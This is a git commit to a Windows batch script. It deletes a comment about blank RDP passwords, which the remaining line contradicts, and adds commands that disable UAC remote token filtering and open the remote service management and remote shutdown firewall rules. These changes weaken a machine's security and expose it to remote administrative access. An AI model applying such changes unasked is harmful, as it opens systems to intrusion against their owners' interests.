c5ad76b5f51f7c89b9489f1ce09938686b837df7
Steven <scared@tuta.io>
2023-05-24 12:45:03 -0400

    Update windows.bat

--- windows.bat
+++ windows.bat
@@ -1,2 +1,4 @@
-REM This is for internal use, enables blank passwords on RDP
 Reg.Exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 1 /f
+Reg.exe add HKLM\Software\Microsoft\windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+netsh advfirewall firewall set rule group="Remote Service Management" new enable=yes
+netsh advfirewall firewall set rule group="Remote Shutdown" new enable=yes
